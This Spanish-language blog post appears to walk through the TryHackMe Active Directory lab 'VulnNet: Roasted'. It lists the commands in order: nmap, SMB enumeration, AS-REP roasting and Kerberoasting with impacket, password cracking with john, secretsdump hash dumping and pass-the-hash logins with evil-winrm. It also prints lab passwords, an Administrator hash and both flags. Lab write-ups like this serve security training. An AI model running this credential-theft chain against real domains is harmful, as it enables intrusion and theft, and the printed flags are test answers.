---
layout:   post
title:    "Walkthrough VulnNet: Roasted."
subtitle: "Starting-Point"
category:   THM
tags:      [Easy, Windows, ASREPRoast, Kerberoasting, Windows-Server, Active-Directory, Walkthrough, Starting-Point,OSCP,EvilWinRM]
---
![list](/assets/img/vulnnet/vulnnet.png){:.lead width="800" height="100" loading="lazy"}

***
<!--more-->

1. this ordered seed list will be replaced by the toc
{:toc}

***

## Reconocimiento

Fase inicial donde recolectamos toda la información posible del objetivo, utilizando 

diferentes técnicas como:

| Caracter.                                   |
|:--------------------------------------------|
|Recopilación de tecnologuias.                |
|Dominios.                                    |
|IPs.                                         |
|Puertos.                                     |
|Servicios.                                   |
|Recopilación de metadatos, etc.              |


***
### nmap

Utizando nmap comprobamos que puertos estan abiertos.


```bash
sudo nmap --open -p- -Pn -n -vvv --min-rate 5000 -sS 10.10.244.143 -oG allports
```
El paso anterior se debe hacer con privileguios (root).
{:.note title="Attention"}

***
### Servicios y versiones

Una vez sabemos que puertos estan abiertos con el comando anterior podremos saber que 

versiones y servicios que corren en los mismo de ahi podremos determinara posibles 

vulnerabilidades.

Esto lo hacemos con el siguiente comando.


```bash
nmap -sCV -p53,135,139,445,5985,49665 10.10.244.143 -oN target -Pn
```
El paso anterior no es nesesario ser (root).
{:.note title="Attention"}

![list](/assets/img/vulnnet/Kali-2022-09-19-14-19-50.png){:.lead width="800" height="100" loading="lazy"}

***
## Analisis de vulnerabilidades

Estando abierto los puertos 139 y 445 imediatamente lo que debemos hacer es tratar de 

explotar el smb,esto lo hacemos con crackmapexec, smbclient,smbmap entre otros.

![list](/assets/img/vulnnet/Kali-2022-09-19-14-31-26.png){:.lead width="800" height="100" loading="lazy"}

```bash
smbclient -L 10.10.244.143 -N
```
{:.note}
Listamos los shares.

Con crackmapexec vemos si el smb esta firmado ademas del dominio entre ota informacion.

![list](/assets/img/vulnnet/Kali-2022-09-19-14-32-17.png){:.lead width="800" height="100" loading="lazy"}

```bash
crackmapexec smb 10.10.244.143
```
{:.note}
El doninio es `vulnnet-rst.local` lo ,lo agrgamos al `/etc/hosts`.

Los siguiente es movernos por el recurso smb o crearnos una montura pero en este caso 

como vemos que hay dos shares con user anonymous esto lo deducimos por su nombre, si 

husmeamos en dichos sharea nos encontramos con archivos.txt que podemos bajarnos a la 

maquina atacante, simplemente son conversaciones entre usuarios del sitema lo cual es 

bueno por lo cual podemos enumerar dichos usuarioa para hacer el ataque de [ASREPRoast], 

el cual implica en tener usuarios del sistema para consegir un hash. 

![list](/assets/img/vulnnet/Kali-2022-09-19-14-46-29.png){:.lead width="800" height="100" loading="lazy"}

{:.note}
Nos habla de un usuario alexa whitehat que es business manager de la empresa.

![list](/assets/img/vulnnet/Kali-2022-09-19-14-46-40.png){:.lead width="800" height="100" loading="lazy"}

{:.note}
Un tal jack goldenhand que el se encarga de las propuestas de negocios.

![list](/assets/img/vulnnet/Kali-2022-09-19-14-46-46.png){:.lead width="800" height="100" loading="lazy"}

{:.note}
Nada interesante.

![list](/assets/img/vulnnet/Kali-2022-09-19-14-50-38.png){:.lead width="800" height="100" loading="lazy"}

{:.note}
Nada interesante.

![list](/assets/img/vulnnet/Kali-2022-09-19-14-50-58.png){:.lead width="800" height="100" loading="lazy"}

{:.note}
Tony skid es el security manager a este debemos prestarle mas atencion por rol en la empresa.

![list](/assets/img/vulnnet/Kali-2022-09-19-14-51-11.png){:.lead width="800" height="100" loading="lazy"}

{:.note}
Johnny leet jefe de infraestructura.

[ASREPRoast]: https://www.hackplayers.com/2020/11/asreproast-o-as-rep-roasting.html#:~:text=El%20ASREPRoast%20es%20una%20t%C3%A9cnica,requiere%20pre%2Dautenticaci%C3%B3n%20en%20kerberos.

Exite varias herramentas que enumeran usauarios y grupos de smb y rcp, podemos usar `rcpclient` 

pero ene ste caso utilizaremos `lookupsid.py`

```bash
lookupsid.py anonymous@10.10.244.143
```
![list](/assets/img/vulnnet/Kali-2022-09-19-15-02-03.png){:.lead width="800" height="100" loading="lazy"}

***
## Explotacion

Con los usuarios que obtubimos anteriormente podemos grepearlos o simplmente copiarlos y 

meterlos aun archivo txt llamado users.txt, y procedemos con el ataque ASREPRoast para esto 

podemos usar `kerbrute`, al caul al listado de usuario debemos agregarle el `@vulnnet-rst.local`, 

en este caso vamos usar [GetNPUsers.py].

```bash
GetNPUsers.py -dc-ip 10.10.244.143 -usersfile users.txt -no-pass vulnnet-rst.local/
```

![list](/assets/img/vulnnet/Kali-2022-09-19-16-06-42.png){:.lead width="800" height="100" loading="lazy"}


Copiamos el hash y lo guardamos en un archivo con el nombre `hash` procedemos a crackear

lo con john the ripper de la siguiente forma.

```bash
john -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash
```

![list](/assets/img/vulnnet/Kali-2022-09-19-16-08-25.png){:.lead width="800" height="100" loading="lazy"}

{:.note}
Esperamos un poco y optenemos la contraseña que es `tj072889*`. 

Por lo anterior tenemos el dominio + un usuario + una contraseña  podemos probar un ataque [Kerberosting]

```bash
GetUserSPNs.py 'vulnnet-rst.local/t-skid:tj072889*' -dc-ip 10.10.206.89
```

![list](/assets/img/vulnnet/Kali-2022-09-19-16-18-02.png){:.lead width="800" height="100" loading="lazy"}

{:.note}
Antes de segir por este camino ya que tenemos usuario y credeciales validas lo que podemos 

hacer loogearnos a al servicion de smb.


Nos logeamos al share de `NETLOGON` en el samba con las credeciales y encontramos un 

archivo.txt con credeciales validas.

```bash
smbclient -U vulnnet-rst.local/t-skid //10.10.244.143/NETLOGON
```

![list](/assets/img/vulnnet/Kali-2022-09-19-16-27-33.png){:.lead width="800" height="100" loading="lazy"}

{:.note}
Inspeccionando el archivo tenemos que strUserNTName = `a-whitehat`y strPassword = `bNdKVkjv3RR9ht`.

Con crackmapexec comprobamos si las credenciales son validad.

```bash
crackmapexec smb 10.10.206.89 -u "a-whitehat" -p "bNdKVkjv3RR9ht"
```

![list](/assets/img/vulnnet/Kali-2022-09-19-16-30-14.png){:.lead width="800" height="100" loading="lazy"}

Podemos conectarnos a la maquina y obner la flag que se encuentra en el direcctorio 

`/Desktop/user.txt`, es `THM{726b7c0baaac1455d05c827b5561f4ed}`.

```bash
evil-winrm -i 10.10.244.143 -u "a-whitehat" -p "bNdKVkjv3RR9ht"
```

![list](/assets/img/vulnnet/Kali-2022-09-19-17-37-50.png){:.lead width="800" height="100" loading="lazy"}

{:.note}
Tendremos que escalar privilegios para obtener la otra flag.

[Kerberosting]: https://www.netwrix.com/cracking_kerberos_tgs_tickets_using_kerberoasting.html

[GetNPUsers.py]: https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py

[reverse-shell]: https://www.revshells.com/

***
## Escalacion de privilegios 

Siempre es bueno ejecutar `WimEnum` Y `ADEnum` para monitorizar y ver los posibles 

vectores para escalar de privilegios.

En este caso usaremos la herramienta [secretsdump.py], este script se encarga de realizar 

un volcado completo de los SAM/LSA Secrets, credenciales cacheadas, información sensible 

almacenada en el registro y los hashes NTLM del sistema.

[secretsdump.py]: https://thehackerway.com/2021/05/24/network-hacking-con-impacket-parte-3/#:~:text=Volcado%20de%20%C2%ABWindows%20Secrets%C2%BB%20con,los%20hashes%20NTLM%20del%20sistema.


```bash
secretsdump.py vulnnet-rst.local/a-whitehat@10.10.244.143
```

{:.note}
Nos muestra los secretos de la mayoria de todos los usuarios peor elque nos interesa en el de Administrator.

Con ese hash de `Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::` 

podemos hacer pass de hash para ingresar al usuario privilegiado de la siguiente manera.

```bash
evil-winrm -i 10.10.244.143 -u 'Administrator' -H 'c2597747aa5e43022a3a3049a3c3b09d'
```

{:.note}
Para hacer pass de hash solo nos interesa el ultimo tercio del hash de administrator.

![list](/assets/img/vulnnet/Kali-2022-09-19-17-30-29.png){:.lead width="800" height="100" loading="lazy"}


Con lo anterior ya somos root lo siguientes es bucar la root de superusuario de la 

misma forma que hicimos con el usuario de menos privileguios.

![list](/assets/img/vulnnet/Kali-2022-09-19-17-38-24.png){:.lead width="800" height="100" loading="lazy"}

Obtenemos la flag que se encuentra en el direcctorio `Desktop\system.txt`, 

es `THM{16f45e3934293a57645f8d7bf71d8d4c}`.

***
```bash
🎉 Felicitaciones ya has comprometido VulnNet: Roasted de Try Hack Me. 🎉
```
{:.centered}
***
Back to [Beginner Track Active Directory](2022-09-21-Beginner-Track-AD.md){:.heading.flip-title}
{:.read-more}
